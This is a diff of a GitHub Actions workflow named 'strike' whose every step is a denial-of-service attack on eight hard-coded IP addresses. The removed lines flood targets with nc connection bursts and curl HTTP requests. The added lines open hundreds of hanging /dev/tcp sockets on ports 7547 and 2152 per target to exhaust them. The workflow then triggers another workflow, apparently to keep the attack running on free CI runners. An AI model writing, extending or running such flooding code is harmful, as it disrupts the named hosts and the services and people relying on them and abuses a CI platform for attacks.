@@ -8,19 +8,19 @@ jobs:
   strike:
     runs-on: ubuntu-latest
     steps:
-      - name: Seize Global Infrastructure
+      - name: Alpha Phase: Session Hanging
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "[!!!] ALPHA 2080: DEPLOYING TOTAL BLACKOUT..."
+          echo "[!!!] ALPHA 2080: INITIATING SUSTAINED EXHAUSTION..."
           TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
           
-          # 10x Payload Density: TCP/UDP/HTTP Triple-Threat
+          # HANGING CONNECTIONS: Maximize socket wait-state
           for T in ${TARGETS[@]}; do
-            # 1. TCP Handshake Saturation
-            for i in {1..300}; do (nc -zv -w 1 $T 179 2152 7547 8080) >/dev/null 2>&1 & done
-            # 2. HTTP Header Flooding (Layer 7)
-            for i in {1..100}; do (curl -A "Sovereign-2080" -s -m 2 "http://$T") >/dev/null 2>&1 & done
+            for i in {1..400}; do
+              (exec 3<>/dev/tcp/$T/7547 && sleep 30) >/dev/null 2>&1 &
+              (exec 3<>/dev/tcp/$T/2152 && sleep 30) >/dev/null 2>&1 &
+            done
           done
-          sleep 45
+          sleep 50
           gh workflow run omega.yml --repo $GITHUB_REPOSITORY
